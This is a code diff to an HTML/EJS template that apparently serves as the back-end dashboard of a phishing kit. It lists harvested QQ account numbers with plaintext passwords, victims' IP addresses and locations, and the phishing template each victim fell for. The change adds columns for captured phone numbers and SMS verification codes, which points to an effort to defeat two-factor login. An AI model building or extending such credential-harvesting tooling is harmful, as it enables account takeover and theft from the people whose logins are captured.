@@ -22,9 +22,11 @@
                                 <thead>
                                     <tr>
                                         <th><input id="checkall" type="checkbox"></th>
-                                        <th>ID</th>
+                                        <!-- <th>ID</th> -->
                                         <th>QQ</th>
                                         <th>QQ密码</th>
+                                        <th>手机号</th>
+                                        <th>验证码</th>
                                         <th>IP地址</th>
                                         <th>归属地</th>
                                         <th>模板名称</th>
@@ -38,9 +40,11 @@
                                         <form action="/data" method="post">
                                             <tr class="<% if (i%2 === 0) { %>odd<%} else {%> even <%}%>gradeX">
                                                 <td><input type="checkbox" class="item_ck" id="<%=datas[i].id%>"></td>
-                                                <td><%=datas[i].id%></td>
+                                                <!-- <td><%=datas[i].id%></td> -->
                                                 <td><%=datas[i].qq%></td>
                                                 <td><%=datas[i].pwd%></td>
+                                                <td><%=datas[i].phone%></td>
+                                                <td><%=datas[i].phoneCode%></td>
                                                 <td class="center"><%=datas[i].ip%></td>
                                                 <td class="center"><%=datas[i].address%></td>
                                                 <td><%=datas[i].tempName%></td>
